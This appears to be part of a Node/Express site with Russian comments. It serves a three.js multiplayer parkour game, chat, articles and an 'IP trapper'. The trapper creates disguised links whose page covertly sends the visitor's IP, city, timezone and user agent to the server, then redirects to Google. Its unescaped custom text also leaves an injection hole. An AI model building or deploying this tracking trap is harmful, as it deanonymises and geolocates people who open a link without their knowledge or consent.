        // Функция спавна парящей текстовой таблички прямо над платформой (сквозная!)
        function spawnSignBoard(x, y, z) {
            // Выбираем псевдослучайную фразу, привязанную к координате Z
            const textIdx = Math.abs(Math.floor(z)) % serverSignTexts.length;
            const text = serverSignTexts[textIdx];

            const group = new THREE.Group();

            // Сама табличка (тонкий прозрачный пласт)
            const boardGeo = new THREE.BoxGeometry(1.6, 0.7, 0.05);
            const boardMat = new THREE.MeshBasicMaterial({
                color: 0x0a0a0a,
                transparent: true,
                opacity: 0.8,
                side: THREE.DoubleSide
            });
            const boardMesh = new THREE.Mesh(boardGeo, boardMat);
            group.add(boardMesh);

            // Текст на табличке
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 128;
            const ctx = canvas.getContext('2d');
            ctx.clearRect(0,0,256,128);
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 22px sans-serif';
            ctx.textAlign = 'center';
            ctx.fillText(text, 128, 68);

            const textTex = new THREE.CanvasTexture(canvas);
            const textMat = new THREE.MeshBasicMaterial({ map: textTex, transparent: true, side: THREE.DoubleSide });
            const textMesh = new THREE.Mesh(new THREE.PlaneGeometry(1.5, 0.6), textMat);
            textMesh.position.z = 0.03; // Чуть впереди
            group.add(textMesh);

            group.position.set(x, y + 1.4, z); // Вешаем на 1.4м выше платформы
            scene.add(group);

            signBoards.push({ group, z });
        }

        function spawnNextBlock() {
            let distZ = -(localRandom() * 1.1 + 3.3); 
            let distX = (localRandom() - 0.5) * 3.8; 
            let distY = (localRandom() - 0.4) * 1.3; 

            lastPlatformX += distX;
            lastPlatformY += distY;
            nextPlatformZ += distZ;

            if (lastPlatformY < -5) lastPlatformY = -3;
            if (lastPlatformY > 5) lastPlatformY = 2;

            const colors = ["#ef4444", "#10b981", "#8b5cf6", "#f59e0b", "#ec4899", "#06b6d4"];
            const color = colors[Math.floor(localRandom() * colors.length)];

            const platX = parseFloat(lastPlatformX.toFixed(2));
            const platY = parseFloat(lastPlatformY.toFixed(2));
            const platZ = parseFloat(nextPlatformZ.toFixed(2));

            createPlatform(platX, platY, platZ, 2.0, 0.6, 2.0, color);

            // ШАНС СПАВНА ТАБЛИЧКИ: спавнится РЕДКО (15% шанс)
            if (localRandom() < 0.15) {
                spawnSignBoard(platX, platY, platZ);
            }
        }

        function updateInfiniteWorld() {
            const triggerZ = nextPlatformZ + 40; 
            if (playerPos.z < triggerZ) {
                for (let i = 0; i < 10; i++) {
                    spawnNextBlock();
                }

                // Выгрузка старых табличек и платформ позади игрока
                const playerPassedZ = playerPos.z + 50;
                
                platforms = platforms.filter(p => {
                    if (p.z > playerPassedZ && p.z !== 0) { 
                        scene.remove(p.mesh);
                        return false;
                    }
                    return true;
                });

                signBoards = signBoards.filter(s => {
                    if (s.z > playerPassedZ) {
                        scene.remove(s.group);
                        return false;
                    }
                    return true;
                });
            }

            const currentDistance = Math.max(0, -playerPos.z);
            document.getElementById('distanceMeter').textContent = currentDistance.toFixed(1) + "м";
        }

        // === УПРАВЛЕНИЕ И ДВИЖЕНИЕ ===
        function setupPhysicsEvents() {
            window.addEventListener('keydown', handleKeyDown);
            window.addEventListener('keyup', handleKeyUp);
            window.addEventListener('mousemove', handleMouseMove);
        }

        function handleKeyDown(e) {
            if (e.code === 'KeyW' || e.code === 'ArrowUp') keys.w = true;
            if (e.code === 'KeyA' || e.code === 'ArrowLeft') keys.a = true;
            if (e.code === 'KeyS' || e.code === 'ArrowDown') keys.s = true;
            if (e.code === 'KeyD' || e.code === 'ArrowRight') keys.d = true;
            if (e.code === 'Space') keys.space = true;
        }

        function handleKeyUp(e) {
            if (e.code === 'KeyW' || e.code === 'ArrowUp') keys.w = false;
            if (e.code === 'KeyA' || e.code === 'ArrowLeft') keys.a = false;
            if (e.code === 'KeyS' || e.code === 'ArrowDown') keys.s = false;
            if (e.code === 'KeyD' || e.code === 'ArrowRight') keys.d = false;
            if (e.code === 'Space') keys.space = false;
        }

        function handleMouseMove(e) {
            if (document.pointerLockElement || e.buttons === 1) {
                const sens = 0.0022;
                cameraRot.yaw -= e.movementX * sens; 
                cameraRot.pitch -= e.movementY * sens; 
                cameraRot.pitch = Math.max(-Math.PI / 2.05, Math.min(Math.PI / 2.05, cameraRot.pitch));
            }
        }

        function respawnPlayer() {
            playerPos = { x: 0, y: 1.5, z: 0 };
            playerVelocity = { x: 0, y: 0, z: 0 };
            cameraRot = { pitch: 0, yaw: 0 };
            if (isGameActive && platforms.length > 30) {
                resetInfiniteMap();
            }
        }

        function updatePlayerPhysics(dt) {
            playerVelocity.y += gravity * dt;

            let moveX = 0;
            let moveZ = 0;

            if (!isTouchDevice) {
                if (keys.w) moveZ -= 1;
                if (keys.s) moveZ += 1;
                if (keys.a) moveX -= 1;
                if (keys.d) moveX += 1;
            } else {
                moveX = touchMoveVector.x;
                moveZ = touchMoveVector.z;
            }

            const sin = Math.sin(cameraRot.yaw);
            const cos = Math.cos(cameraRot.yaw);
            
            let worldMoveX = moveX * cos + moveZ * sin;
            let worldMoveZ = -moveX * sin + moveZ * cos;

            const length = Math.sqrt(worldMoveX * worldMoveX + worldMoveZ * worldMoveZ);
            if (length > 0) {
                worldMoveX = (worldMoveX / length) * moveSpeed;
                worldMoveZ = (worldMoveZ / length) * moveSpeed;
            }

            playerPos.x += worldMoveX * dt;
            playerPos.z += worldMoveZ * dt;
            playerPos.y += playerVelocity.y * dt;

            // КОЛЛИЗИИ (СВЕРХНАДЁЖНАЯ ФИЗИКА НАСТУПЛЕНИЯ НА ПЛАТФОРМУ)
            isGrounded = false;
            const playerHeight = 1.3;
            const playerRadius = 0.38;

            platforms.forEach(p => {
                const minX = p.x - p.w/2 - playerRadius;
                const maxX = p.x + p.w/2 + playerRadius;
                const minZ = p.z - p.d/2 - playerRadius;
                const maxZ = p.z + p.d/2 + playerRadius;

                if (playerPos.x > minX && playerPos.x < maxX && playerPos.z > minZ && playerPos.z < maxZ) {
                    const platformTop = p.y + p.h/2;
                    if (playerPos.y - playerHeight <= platformTop && playerPos.y - playerHeight >= platformTop - 0.75) {
                        if (playerVelocity.y <= 0) {
                            playerPos.y = platformTop + playerHeight;
                            playerVelocity.y = 0;
                            isGrounded = true;
                        }
                    }
                }
            });

            if (isGrounded && (keys.space || mobileJumpPressed)) {
                playerVelocity.y = jumpStrength;
                isGrounded = false;
                mobileJumpPressed = false; 
            }

            // ПАДЕНИЕ В ТУМАН (СПАВН)
            if (playerPos.y < -18) {
                respawnPlayer();
            }
        }

        function updateCamera() {
            camera.position.set(playerPos.x, playerPos.y, playerPos.z);
            
            const target = new THREE.Vector3();
            target.x = playerPos.x - Math.sin(cameraRot.yaw) * Math.cos(cameraRot.pitch);
            target.y = playerPos.y + Math.sin(cameraRot.pitch);
            target.z = playerPos.z - Math.cos(cameraRot.yaw) * Math.cos(cameraRot.pitch);
            
            camera.lookAt(target);
        }

        // === МОБИЛЬНЫЙ ДЖОЙСТИК ===
        let mobileJumpPressed = false;
        function setupMobileEvents() {
            const joystickBoundary = document.getElementById('joystickBoundary');
            const joystickKnob = document.getElementById('joystickKnob');
            const jumpButton = document.getElementById('jumpButton');

            jumpButton.addEventListener('touchstart', (e) => {
                e.preventDefault();
                mobileJumpPressed = true;
            });

            let touchStartPoint = { x: 0, y: 0 };
            window.addEventListener('touchstart', (e) => {
                for (let i = 0; i < e.touches.length; i++) {
                    if (e.touches[i].clientX > window.innerWidth / 2) {
                        touchStartPoint.x = e.touches[i].clientX;
                        touchStartPoint.y = e.touches[i].clientY;
                    }
                }
            });

            window.addEventListener('touchmove', (e) => {
                for (let i = 0; i < e.touches.length; i++) {
                    if (e.touches[i].clientX > window.innerWidth / 2) {
                        const dx = e.touches[i].clientX - touchStartPoint.x;
                        const dy = e.touches[i].clientY - touchStartPoint.y;

                        const sens = 0.005;
                        cameraRot.yaw -= dx * sens; 
                        cameraRot.pitch -= dy * sens; 
                        cameraRot.pitch = Math.max(-Math.PI / 2.05, Math.min(Math.PI / 2.05, cameraRot.pitch));

                        touchStartPoint.x = e.touches[i].clientX;
                        touchStartPoint.y = e.touches[i].clientY;
                    }
                }
            });

            joystickBoundary.addEventListener('touchstart', (e) => {
                e.preventDefault();
                joystickActive = true;
                const touch = e.touches[0];
                joystickStart.x = touch.clientX;
                joystickStart.y = touch.clientY;
            });

            joystickBoundary.addEventListener('touchmove', (e) => {
                if (!joystickActive) return;
                const touch = e.touches[0];
                const dx = touch.clientX - joystickStart.x;
                const dy = touch.clientY - joystickStart.y;
                
                const limit = 50; 
                const dist = Math.sqrt(dx*dx + dy*dy);
                
                let moveX = dx;
                let moveY = dy;
                if (dist > limit) {
                    moveX = (dx / dist) * limit;
                    moveY = (dy / dist) * limit;
                }

                joystickKnob.style.transform = \`translate(\${moveX}px, \${moveY}px)\`;
                touchMoveVector.x = moveX / limit;
                touchMoveVector.z = moveY / limit;
            });

            joystickBoundary.addEventListener('touchend', () => {
                joystickActive = false;
                joystickKnob.style.transform = 'translate(0px, 0px)';
                touchMoveVector = { x: 0, z: 0 };
            });
        }

        // РИСОВАНИЕ СПРАЙТА-НИКНЕЙМА ДЛЯ ДРУГИХ ИГРОКОВ
        function createNicknameTexture(text) {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 64;
            const ctx = canvas.getContext('2d');
            
            ctx.clearRect(0, 0, 256, 64);
            ctx.fillStyle = 'rgba(5, 5, 5, 0.75)';
            ctx.roundRect ? ctx.roundRect(10, 10, 236, 44, 8) : ctx.rect(10, 10, 236, 44);
            ctx.fill();

            ctx.font = 'bold 20px sans-serif';
            ctx.fillStyle = '#60a5fa'; 
            ctx.textAlign = 'center';
            ctx.fillText(text, 128, 38);

            const texture = new THREE.CanvasTexture(canvas);
            const material = new THREE.SpriteMaterial({ map: texture, transparent: true });
            const sprite = new THREE.Sprite(material);
            sprite.scale.set(1.5, 0.4, 1);
            return sprite;
        }

        function startMultiplayerLoop() {
            multiplayerInterval = setInterval(async () => {
                try {
                    const res = await fetch('/api/parkour/sync', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            nickname: myNickname,
                            x: parseFloat(playerPos.x.toFixed(2)),
                            y: parseFloat(playerPos.y.toFixed(2)),
                            z: parseFloat(playerPos.z.toFixed(2)),
                            ry: cameraRot.yaw, 
                            rx: cameraRot.pitch 
                        })
                    });
                    const serverPlayers = await res.json();
                    updateOtherPlayersData(serverPlayers);
                } catch (e) {}
            }, 100); 
        }

        function updateOtherPlayersData(serverPlayers) {
            for (const nick in otherPlayers) {
                if (!serverPlayers[nick]) {
                    scene.remove(otherPlayers[nick].group);
                    delete otherPlayers[nick];
                }
            }

            for (const nick in serverPlayers) {
                if (nick === myNickname) continue; 
                // Игнорируем тех, кто просто запрашивает статус из главного лобби
                if (serverPlayers[nick].lobbyOnly) continue;

                const pData = serverPlayers[nick];

                if (!otherPlayers[nick]) {
                    const group = new THREE.Group();

                    const bodyGeo = new THREE.CylinderGeometry(0.3, 0.3, 1.2, 8);
                    const bodyMat = new THREE.MeshPhongMaterial({ color: 0x3b82f6, emissive: 0x1d4ed8, emissiveIntensity: 0.3 });
                    const bodyMesh = new THREE.Mesh(bodyGeo, bodyMat);
                    bodyMesh.position.y = 0.6;
                    group.add(bodyMesh);

                    const headGroup = new THREE.Group();
                    headGroup.position.y = 1.35;

                    const headGeo = new THREE.SphereGeometry(0.28, 12, 12);
                    const headMat = new THREE.MeshPhongMaterial({ color: 0xff00ff, emissive: 0x701a75, emissiveIntensity: 0.4 });
                    const headMesh = new THREE.Mesh(headGeo, headMat);
                    headGroup.add(headMesh);

                    // ГЛАЗКИ НА ЛИЦЕ
                    const eyeGeo = new THREE.SphereGeometry(0.06, 8, 8);
                    const eyeMat = new THREE.MeshBasicMaterial({ color: 0xffffff });
                    const pupilGeo = new THREE.SphereGeometry(0.03, 8, 8);
                    const pupilMat = new THREE.MeshBasicMaterial({ color: 0x000000 });

                    const leftEye = new THREE.Group();
                    const leftWhite = new THREE.Mesh(eyeGeo, eyeMat);
                    const leftPupil = new THREE.Mesh(pupilGeo, pupilMat);
                    leftPupil.position.set(0, 0, -0.04); 
                    leftEye.add(leftWhite, leftPupil);
                    leftEye.position.set(-0.11, 0.05, -0.22); 
                    headGroup.add(leftEye);

                    const rightEye = new THREE.Group();
                    const rightWhite = new THREE.Mesh(eyeGeo, eyeMat);
                    const rightPupil = new THREE.Mesh(pupilGeo, pupilMat);
                    rightPupil.position.set(0, 0, -0.04);
                    rightEye.add(rightWhite, rightPupil);
                    rightEye.position.set(0.11, 0.05, -0.22);
                    headGroup.add(rightEye);

                    group.add(headGroup);

                    const nickSprite = createNicknameTexture(nick);
                    nickSprite.position.set(0, 1.95, 0); 
                    group.add(nickSprite);

                    scene.add(group);

                    otherPlayers[nick] = {
                        group: group,
                        headMesh: headGroup, 
                        targetPos: { x: pData.x, y: pData.y, z: pData.z },
                        targetRy: pData.ry,
                        targetRx: pData.rx
                    };
                } else {
                    otherPlayers[nick].targetPos = { x: pData.x, y: pData.y, z: pData.z };
                    otherPlayers[nick].targetRy = pData.ry;
                    otherPlayers[nick].targetRx = pData.rx;
                }
            }
        }

        function renderOtherPlayers() {
            const lerpFactor = 0.25; 
            for (const nick in otherPlayers) {
                const player = otherPlayers[nick];
                const group = player.group;

                group.position.x += (player.targetPos.x - group.position.x) * lerpFactor;
                group.position.y += (player.targetPos.y - 1.4 - group.position.y) * lerpFactor; 
                group.position.z += (player.targetPos.z - group.position.z) * lerpFactor;

                group.rotation.y += (player.targetRy - group.rotation.y) * lerpFactor;
                player.headMesh.rotation.x += (player.targetRx - player.headMesh.rotation.x) * lerpFactor;
            }
        }

        function onWindowResize() {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        }
    </script>
</body>
</html>
    `);
});

// === API ТРЭППЕРА IP ===
app.post('/api/ip/create', (req, res) => {
    const id = Math.random().toString(36).substring(2, 8);
    currentTrap = {
        id: id,
        createdAt: Date.now(),
        customText: req.body.customText || ""
    };
    lastResult = null;
    res.json({ success: true, link: `${APP_URL}/t/${id}`, id });
});

app.get('/t/:id', (req, res) => {
    const id = req.params.id;
    if (!currentTrap || currentTrap.id !== id) {
        return res.send('<body style="background:#050505;color:#e5e7eb;display:flex;align-items:center;justify-content:center;height:100vh;"><h1>Ссылка устарела</h1></body>');
    }
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const customTextHtml = currentTrap.customText 
        ? `<h1 style="font-size: 2.5rem; font-weight: 800; text-align: center; max-width: 80%; text-shadow: 0 0 10px rgba(255,0,0,0.5);">${currentTrap.customText}</h1>` 
        : ``;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Загрузка...</title><meta charset="utf-8"></head>
        <body style="background:#050505;color:#e5e7eb;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
            ${customTextHtml}
            <script>
                fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(geo => {
                    const data = { 
                        ip: geo.ip || "${ip}", 
                        device: navigator.userAgent, 
                        timezone: geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
                        city: geo.city || "Неизвестно"
                    };
                    sendData(data);
                })
                .catch(() => {
                    fetch('https://ipinfo.io/json')
                    .then(res => res.json())
                    .then(geo => {
                        const data = { 
                            ip: geo.ip || "${ip}", 
                            device: navigator.userAgent, 
                            timezone: geo.timezone || "Не определен",
                            city: geo.city || "Неизвестно"
                        };
                        sendData(data);
                    })
                    .catch(() => {
                        sendData({ ip: "${ip}", device: navigator.userAgent, timezone: "Неизвестно", city: "Неизвестно" });
                    });
                });

                function sendData(data) {
                    const host = window.location.protocol + '//' + window.location.host;
                    fetch(host + '/api/ip/collect/${id}', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).then(() => {
                        if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
                    }).catch(() => {
                        if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
                    });
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/api/ip/collect/:id', (req, res) => {
    const id = req.params.id;
    if (currentTrap && currentTrap.id === id) {
        lastResult = {
            ip: req.body.ip,
            device: req.body.device,
            timezone: req.body.timezone,
            city: req.body.city,
            time: new Date().toLocaleTimeString()
        };
        currentTrap = null;
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "NoActive" });
    }
});

app.get('/api/ip/status', (req, res) => {
    if (lastResult) res.json({ status: 'caught', data: lastResult });
    else if (currentTrap) res.json({ status: 'pending' });
    else res.json({ status: 'expired' });
});

// === API СТАТЕЙ ===
app.get('/api/articles', (req, res) => res.json(globalArticles));
app.post('/api/articles', (req, res) => {
    const { id, title, desc, content } = req.body;
    if (!title || !content) return res.status(400).json({ error: "No data" });
    
    // Лимит в 50 статей: убираем старые, если превышен лимит
    if (globalArticles.length >= 50) {
        // Оставляем промо-статью, удаляем вторую по списку
        if(globalArticles[0].id === 'promo') {
            globalArticles.splice(1, 1);
        } else {
            globalArticles.shift();
        }
    }

    const articleId = id || Math.random().toString(36).substring(2, 10);
    globalArticles.push({ 
        id: articleId, 
        title, 
        desc: desc || "Без описания", 
        content,
        createdAt: Date.now() // Запоминаем время публикации
    });
    res.json({ success: true });
});

// === API ЧАТА ===
app.get('/api/chat/messages', (req, res) => res.json(chatMessages));
app.post('/api/chat/send', (req, res) => {
    const { username, text, tag } = req.body;
    if(!username || !text) return res.status(400).json({ error: "Empty" });
    chatMessages.push({ username, text, tag, time: new Date().toLocaleTimeString() });
    if (chatMessages.length > 30) chatMessages.shift();
    res.json({ success: true });
});

// === API СИНХРОНИЗАЦИИ МУЛЬТИПЛЕЕРА ===
app.post('/api/parkour/sync', (req, res) => {
    const { nickname, x, y, z, rx, ry, lobbyOnly } = req.body;
    if (!nickname) return res.status(400).json({ error: "No Nick" });

    onlinePlayers[nickname] = {
        x: x || 0,
        y: y || 0,
        z: z || 0,
        rx: rx || 0, 
        ry: ry || 0, 
        lobbyOnly: lobbyOnly || false,
        lastSeen: Date.now()
    };

    res.json(onlinePlayers);
});

app.listen(PORT, () => {
    console.log(`[CtalkeP] Бесконечный 3D-Паркур успешно запущен и исправлен на порту: ${PORT}`);
});
